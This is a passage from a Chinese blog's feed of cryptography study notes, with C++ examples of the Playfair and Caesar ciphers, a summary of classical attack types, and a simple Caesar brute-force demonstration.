&lt;span class="k">auto&lt;/span> &lt;span class="n">c2_pos&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">get_row_col&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">matrix&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">char_pair&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;j&amp;#39;&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="sc">&amp;#39;i&amp;#39;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="n">char_pair&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">c1_pos&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">first&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">c2_pos&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">first&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 同一行，取同行下一个字符
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="n">row&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">c1_pos&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">first&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">c1_col&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">c1_pos&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">second&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="mi">5&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="n">c1_pos&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">second&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">c2_col&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">c2_pos&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">second&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="mi">5&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="n">c2_pos&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">second&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ciphertext&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">push_back&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">matrix&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">row&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">c1_col&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="n">ciphertext&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">push_back&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">matrix&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">row&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">c2_col&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="nf">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">c1_pos&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">second&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">c2_pos&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">second&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 同一列，取同列下一个字符
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="n">col&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">c1_pos&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">second&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">c1_row&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">c1_pos&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">first&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="mi">5&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="n">c1_pos&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">first&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">c2_row&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">c2_pos&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">first&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="o">&amp;gt;=&lt;/span> &lt;span class="mi">5&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="n">c2_pos&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">first&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ciphertext&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">push_back&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">matrix&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">c1_row&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">col&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="n">ciphertext&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">push_back&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">matrix&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">c2_row&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">col&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// 不同行也不同列，取本行，另一字符所在列的字符
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="n">row&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">c1_pos&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">first&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">c1_col&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">c2_pos&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">second&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">auto&lt;/span> &lt;span class="n">c2_col&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">c1_pos&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">second&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">ciphertext&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">push_back&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">matrix&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">row&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">c1_col&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="n">ciphertext&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">push_back&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">matrix&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">row&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="n">c2_col&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">ciphertext&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="k">auto&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nl">row&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">playfair_matrix&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;haoye&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">row&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;ciphertext:&amp;#34;&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">playfair_cipher&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;helloworld&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;haoye&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">endl&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>以上是 playfair 加密的 c++ 实现。比较怪的是 playfair 网上可以找到很多变体，比如 &lt;a class="link" href="http://www.practicalcryptography.com/ciphers/classical-era/playfair/#javascript-example-of-the-playfair-cipher" target="_blank" rel="noopener"
>practice cryptography&lt;/a> 描述和实现的 playfair 算法是在分组阶段，把重复出现的第二个字符替换成 &lt;code>x&lt;/code> 。&lt;/p>
&lt;p>解密没有在这里实现，解密函数规则如下：&lt;/p>
&lt;ul>
&lt;li>如果一组两个字母在同一行，则用前一列字母替换，第一列用最后一列字母替换。&lt;/li>
&lt;li>如果一组两个字母在同一列，则用前一行字母替换，第一行用最后一行字母替换。&lt;/li>
&lt;li>如果一组两个字符不在同一列同一行，则取同一行，一组中另一字母所在列的字母替换。&lt;/li>
&lt;/ul>
&lt;p>就是把加密规则反过来执行，唯一的区别是在分组阶段不用考虑相同字母，出现相同字母说明密文有问题，可以跳过这一组字母。最后解密结果会出现多余的&lt;code>x&lt;/code>，如果明文包含&lt;code>j&lt;/code>的话解密结果会变成&lt;code>i&lt;/code>。&lt;/p>
&lt;h2 id="结论">结论&lt;/h2>
&lt;p>简要描述 playfair 算法加密过程：&lt;/p>
&lt;ul>
&lt;li>从密钥构造 5x5 矩阵&lt;/li>
&lt;li>对明文按两个字母一组分组，分组过程中处理连续重复字符（重复字母间插入&lt;code>x&lt;/code>）和孤立字母（末尾剩余的最后一个字母也加上&lt;code>x&lt;/code>）&lt;/li>
&lt;li>按规则，对一组两个字母进行替换，直到所有明文都被替换完成
&lt;ul>
&lt;li>如果两个字母在矩阵同一行，取字母在本行的下一个字母替换，行末字母取行首。&lt;/li>
&lt;li>如果两个字母在矩阵同一列，取字母在本列的下一个字母替换，列末字母取列首。&lt;/li>
&lt;li>如果不同行不同列，取字母本行，本组另一字母所在列的字母替换。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>playfair 密码的相比简单单表替换，分析难度大得多。但依然完整保留了语言的结构特征，因此分析依然比较容易。&lt;/p></description></item><item><title>密码学入门01 - 古典密码#1</title><link>https://nnnewb.github.io/blog/p/cryptography-introduction-01/</link><pubDate>Thu, 11 Nov 2021 11:35:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/cryptography-introduction-01/</guid><description>&lt;img src="https://nnnewb.github.io/blog/p/cryptography-introduction-01/cover.jpg" alt="Featured image of post 密码学入门01 - 古典密码#1" />&lt;h2 id="前言">前言&lt;/h2>
&lt;p>本文是学习《密码编码学与网络安全》一书的笔记，关于传统加密技术一章。&lt;/p>
&lt;h2 id="0x01-对称密码模型">0x01 对称密码模型&lt;/h2>
&lt;p>对称加密，也称传统加密或单钥加密，是20世纪70年代公钥密码产生之前唯一的加密类型。迄今为止，它仍是使用最广泛的加密类型。&lt;/p>
&lt;p>对称加密方案有5个基本成分：&lt;/p>
&lt;ul>
&lt;li>明文：原始可以理解的消息或数据，是算法的输入。&lt;/li>
&lt;li>加密算法：加密算法对明文进行各种代替和变换。&lt;/li>
&lt;li>密钥：密钥也是加密算法的输入。密钥独立于明文和算法。算法根据所用的特定密钥而产生不同的输出。算法所用的确切代替和变换也依靠密钥。&lt;/li>
&lt;li>密文：作为算法的输出，看起来完全随机而杂乱的消息，依赖于明文和密钥。对于给定的消息，不同密钥产生不同的密文，密文看上去是随机的数据流并且其意义是不可理解的。&lt;/li>
&lt;li>解密算法：本质上是加密算法的逆运算。输入密文和密钥，输出原始明文。&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110140236382.png"
width="1155"
height="377"
srcset="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110140236382_hu8783c317e7f9de22b27c24c57fb0b0d7_134857_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110140236382_hu8783c317e7f9de22b27c24c57fb0b0d7_134857_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211110140236382"
class="gallery-image"
data-flex-grow="306"
data-flex-basis="735px"
>&lt;/p>
&lt;p>传统密码的安全使用要满足两个要求：&lt;/p>
&lt;ul>
&lt;li>加密算法必须是足够强的。即使攻击者拥有一定数量的密文和产生这些密文的明文，他也不能破译密文或发现密钥。&lt;/li>
&lt;li>发送者和接收者必须在某种安全的形式下获得密钥并保证密钥安全。如果有人发现密钥，并知道算法，就能解读使用该密钥加密的所有通信。&lt;/li>
&lt;/ul>
&lt;p>我们假设基于已知密文和加密/解密算法而破译消息是不实际的，我们不需要算法保密，仅需要密钥保密。如果密钥是由信息的发送方产生的，那么它要通过某种安全信道发送到接收方；另一种是由第三方生成密钥后再安全地分发给发送方和接收方。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="c1">// 明文X，共 m 个元素
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">byte&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">m&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">X&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">X1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">X2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">X3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">X4&lt;/span>&lt;span class="p">,...,&lt;/span>&lt;span class="n">Xm&lt;/span>&lt;span class="p">};&lt;/span>
&lt;span class="c1">// 密钥K，共 j 个元素
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">byte&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">j&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">K&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">K1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">K2&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">K3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">K4&lt;/span>&lt;span class="p">,...,&lt;/span>&lt;span class="n">Kj&lt;/span>&lt;span class="p">};&lt;/span>
&lt;span class="c1">// 加密算法E，以明文和密钥为输入，输出密文 Y
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">byte&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="n">Y&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">E&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">X&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">K&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="c1">// 解密算法D，以密文和密钥为输入，输出明文 X
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="n">byte&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="n">X&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">D&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Y&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">K&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="11-密码编码学">1.1 密码编码学&lt;/h3>
&lt;p>密码编码系统有三个独立特征：&lt;/p>
&lt;ul>
&lt;li>&lt;strong>转换明文为密文的运算类型&lt;/strong>。&lt;strong>所有的加密算法都基于两个原理：代替和置换&lt;/strong>。代替是将明文中的每个元素（如位、字母、位组或字母组）映射成另一个元素；置换是将明文中的元素重新排列。上述运算的基本要求是不允许有信息丢失（所有运算都是可逆的）。大多密码体制也称为乘积密码系统，都使用了多层代替和置换。&lt;/li>
&lt;li>&lt;strong>所用的密钥数&lt;/strong>。如果发送方和接收方使用相同的密钥，这种密码就称为对称密码、单密钥密码或传统密码。如果发收双方使用不同的密钥，这种密码就称为非对称密码、双钥或公钥密码。&lt;/li>
&lt;li>&lt;strong>处理明文的方法&lt;/strong>。分组密码每次处理输入的一组元素，相应地输出一组元素。流密码则是连续地处理输入元素，每次输出一个元素。&lt;/li>
&lt;/ul>
&lt;p>攻击密码系统的典型目标是恢复使用的密钥，而不仅仅恢复出单个密文对应的明文。攻击传统密码有两种通用的方法。&lt;/p>
&lt;ul>
&lt;li>&lt;strong>密码分析学&lt;/strong>：密码分析学攻击依赖于算法的性质、明文的一般特征或某些明密文对。这种攻击形式企图利用算法的特征来推导出特定的明文或使用的密钥。&lt;/li>
&lt;li>&lt;strong>穷举攻击&lt;/strong>：攻击者对一条密文尝试所有可能的密钥，直到把它转化为可读的有意义的明文。平均而言，获得成功至少要尝试所有可能的密钥的一半。&lt;/li>
&lt;/ul>
&lt;p>基于密码分析者知道的信息的多少，概括密码攻击的几种类型如下。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>攻击类型&lt;/th>
&lt;th>攻击者已知的信息&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>唯密文攻击&lt;/td>
&lt;td>加密算法；密文；&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>已知明文攻击&lt;/td>
&lt;td>加密算法；密文；与待解密密文同一密钥加密的一个或多个明密文对；&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>选择明文攻击&lt;/td>
&lt;td>加密算法；密文；分析者选择的明文，以及对应的（使用和待解密密文同一密钥）加密的密文；&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>选择密文攻击&lt;/td>
&lt;td>加密算法；密文；分析者选择的密文，以及对应的（使用和待解密密文同一密钥）的解密明文；&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>选择文本攻击&lt;/td>
&lt;td>加密算法；密文；分析者选的明文，以及对应的密文；分析者选择的密文，以及对应的明文，使用和待解密密文同一密钥。&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>唯密文攻击最容易防范，但很多情况下分析者可以得到更多的信息。比如 postscript 格式加密的文件总是以相同的格式开头，电子金融消息往往有标准化的文件头或者标志，类似的例子还有很多，这些都是已知明文攻击的例子。有这些知识的分析者就可以从转换明文的方法入手来推导出密钥。&lt;/p>
&lt;p>与已知明文攻击紧密相关的是可能词攻击。如果攻击者处理的是一些特定的信息，他就可能知道其中的部分内容。比如说，某公司开发的程序源代码就可能包含该公司的版权信息，并放在某个标准位置。&lt;/p>
&lt;p>如果分析者能通过某种方式让发送方在发送的信息中插入一段由他选择的信息，那么选择明文攻击就有可能实现。一般来说，如果分析者有办法选择明文加密，那么他将特意选取那些最有可能会付出密钥的数据。&lt;/p>
&lt;p>只有相对较弱的算法才抵挡不住唯密文攻击，一般地说，加密算法起码要能经受住已知明文攻击才行。&lt;/p>
&lt;p>如果一个密码体制满足条件：无论有多少可使用的密文，都不足以唯一地确定密文所对应的明文，则称该加密体制是无条件安全的。也就是攻击者无论花多少时间，都无法将密文解密，因为他所需的信息不在密文中。除了一次一密之外所有的加密算法都不是无条件安全的。&lt;/p>
&lt;p>加密算法使用者应该尽量挑选满足下面标准的算法：&lt;/p>
&lt;ul>
&lt;li>破译密码的代价超过密文信息的价值。&lt;/li>
&lt;li>破译密码的时间超出密文信息的有效生命期。&lt;/li>
&lt;/ul>
&lt;p>如果满足上述标准中任意一条则它在计算上是安全的，但估计攻击者破译密文所需的工作量是非常困难的。&lt;/p>
&lt;p>从穷举法入手，考虑所需的时间。穷举要获得成功平均来说必须尝试所有可能密钥的一半，下图给出了不同密钥空间穷举尝试所需的时间。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110150214623.png"
width="1431"
height="356"
srcset="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110150214623_hua784c719a6627b81510d7a296f0c9cd9_192031_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cryptography-introduction-01/image-20211110150214623_hua784c719a6627b81510d7a296f0c9cd9_192031_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211110150214623"
class="gallery-image"
data-flex-grow="401"
data-flex-basis="964px"
>&lt;/p>
&lt;h2 id="0x02-代替技术">0x02 代替技术&lt;/h2>
&lt;h3 id="21-caesar-凯撒密码">2.1 Caesar 凯撒密码&lt;/h3>
&lt;p>已知最早的代替密码是由 julius caesar 发明的 caesar 密码。caesar 密码非常简单，就是对字母表中的每个字母，用它之后的第三个字母来代替，字母表是首尾相连循环的。&lt;/p>
&lt;p>凯撒密码可以这样表达：&lt;code>C = E(k, p) = (p + k) mod 26&lt;/code>。&lt;/p>
&lt;p>凯撒密码的解密算法可以这样表达：&lt;code>p = D(k, C) = (C - k) mod 26&lt;/code>。&lt;/p>
&lt;p>其中 k 的取值范围是 1-25，取值为 0 的情况下就是明文；取值26和取值0相同；取值超过 26 则相当于是取了 &lt;code>k mod 26&lt;/code> ，因为字母表是循环的；取负数相当于取 &lt;code>26 + k&lt;/code>，因为字母表是循环的。&lt;/p>
&lt;p>一个简单的实现如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="k">enum&lt;/span> &lt;span class="k">class&lt;/span> &lt;span class="nc">CryptMode&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">encrypt&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="n">decrypt&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="n">caesar&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">k&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="n">plaintext&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">CryptMode&lt;/span> &lt;span class="n">mode&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="n">output&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="nl">c&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">plaintext&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">mode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">CryptMode&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">decrypt&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">push_back&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="sc">&amp;#39;A&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">k&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="mi">26&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="sc">&amp;#39;a&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">output&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">push_back&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">c&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="sc">&amp;#39;a&amp;#39;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">k&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="mi">26&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="sc">&amp;#39;A&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">output&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>对于输入 &lt;code>hello&lt;/code> ，&lt;code>k=3&lt;/code>，输出为 &lt;code>KHOOR&lt;/code> 。&lt;/p>
&lt;p>如果已知某给定的密文是 caesar 密码，穷举攻击是很容易实现的：只要简单地测试25种可能的密钥。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cpp" data-lang="cpp">&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">vector&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">brute_force_caesar&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="n">ciphertext&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">vector&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">k&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">k&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mi">25&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">k&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">result&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">push_back&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">caesar&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">k&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ciphertext&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">CryptMode&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">decrypt&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="n">result&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>将前面的密文输入，得到输出如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">brute force caesar: jgnnq
brute force caesar: ifmmp
brute force caesar: hello
